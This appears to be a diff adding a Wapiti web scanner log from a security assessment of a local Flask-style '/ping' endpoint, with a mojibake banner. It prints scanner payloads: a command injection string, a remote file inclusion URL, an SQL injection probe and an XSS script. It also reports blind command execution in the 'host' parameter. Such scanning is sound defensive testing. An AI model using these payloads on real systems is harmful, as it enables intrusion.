@@ -1,0 +1,89 @@
+﻿
+ ΓûêΓûêΓòù    ΓûêΓûêΓòù ΓûêΓûêΓûêΓûêΓûêΓòù ΓûêΓûêΓûêΓûêΓûêΓûêΓòù ΓûêΓûêΓòùΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓòùΓûêΓûêΓòùΓûêΓûêΓûêΓûêΓûêΓûêΓòù
+ ΓûêΓûêΓòæ    ΓûêΓûêΓòæΓûêΓûêΓòöΓòÉΓòÉΓûêΓûêΓòùΓûêΓûêΓòöΓòÉΓòÉΓûêΓûêΓòùΓûêΓûêΓòæΓòÜΓòÉΓòÉΓûêΓûêΓòöΓòÉΓòÉΓò¥ΓûêΓûêΓòæΓòÜΓòÉΓòÉΓòÉΓòÉΓûêΓûêΓòù
+ ΓûêΓûêΓòæ ΓûêΓòù ΓûêΓûêΓòæΓûêΓûêΓûêΓûêΓûêΓûêΓûêΓòæΓûêΓûêΓûêΓûêΓûêΓûêΓòöΓò¥ΓûêΓûêΓòæ   ΓûêΓûêΓòæ   ΓûêΓûêΓòæ ΓûêΓûêΓûêΓûêΓûêΓòöΓò¥
+ ΓûêΓûêΓòæΓûêΓûêΓûêΓòùΓûêΓûêΓòæΓûêΓûêΓòöΓòÉΓòÉΓûêΓûêΓòæΓûêΓûêΓòöΓòÉΓòÉΓòÉΓò¥ ΓûêΓûêΓòæ   ΓûêΓûêΓòæ   ΓûêΓûêΓòæ ΓòÜΓòÉΓòÉΓòÉΓûêΓûêΓòù
+ ΓòÜΓûêΓûêΓûêΓòöΓûêΓûêΓûêΓòöΓò¥ΓûêΓûêΓòæ  ΓûêΓûêΓòæΓûêΓûêΓòæ     ΓûêΓûêΓòæ   ΓûêΓûêΓòæ   ΓûêΓûêΓòæΓûêΓûêΓûêΓûêΓûêΓûêΓòöΓò¥
+  ΓòÜΓòÉΓòÉΓò¥ΓòÜΓòÉΓòÉΓò¥ ΓòÜΓòÉΓò¥  ΓòÜΓòÉΓò¥ΓòÜΓòÉΓò¥     ΓòÜΓòÉΓò¥   ΓòÜΓòÉΓò¥   ΓòÜΓòÉΓò¥ΓòÜΓòÉΓòÉΓòÉΓòÉΓòÉΓò¥  
+Wapiti 3.3.2 (wapiti-scanner.github.io)
+[*] Be careful! New moon tonight.
+CSP is not set for URL: http://127.0.0.1:5000/ping?host=127.0.0.1
+X-Frame-Options is not set on http://127.0.0.1:5000/ping?host=127.0.0.1
+X-Content-Type-Options is not set on http://127.0.0.1:5000/ping?host=127.0.0.1
+[*] Saving scan state, please wait...
+This scan has been saved in the file C:\Users\hp\.wapiti\scans\127.0.0.1_5000_domain_ce32cdda.db
+[*] Wapiti found 1 URLs and forms during the scan
+
+[*] Launching module backup
+[+] GET http://127.0.0.1:5000/ping?host=127.0.0.1 (0)
+
+[*] Launching module exec
+[+] GET http://127.0.0.1:5000/ping?host=127.0.0.1 (0)
+---
+Received a HTTP 500 error in http://127.0.0.1:5000/ping
+Evil request:
+    GET /ping?host=id HTTP/1.1
+    host: 127.0.0.1:5000
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+Blind command execution in http://127.0.0.1:5000/ping via injection in the parameter host
+Evil request:
+    GET /ping?host=%26ping%20-n%2025%20127.0.0.1%26 HTTP/1.1
+    host: 127.0.0.1:5000
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+
+[*] Launching module file
+[+] GET http://127.0.0.1:5000/ping?host=127.0.0.1 (0)
+---
+Received a HTTP 500 error in http://127.0.0.1:5000/ping
+Evil request:
+    GET /ping?host=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:5000
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+
+[*] Launching module sql
+[+] GET http://127.0.0.1:5000/ping?host=127.0.0.1 (0)
+---
+Received a HTTP 500 error in http://127.0.0.1:5000/ping
+Evil request:
+    GET /ping?host=127.0.0.1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:5000
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+
+[*] Launching module xss
+[+] GET http://127.0.0.1:5000/ping?host=127.0.0.1 (0)
+---
+Received a HTTP 500 error in http://127.0.0.1:5000/ping
+Evil request:
+    GET /ping?host=%3C%2Ftitle%3E%3CScRiPt%3Ealert%28%27wbn1kdxs7s%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    host: 127.0.0.1:5000
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+
+[*] Generating report...
+A report has been generated in the file C:\Users\hp\Documents\rlogics-security-assessment\devsecops\dast\results\wapiti.json
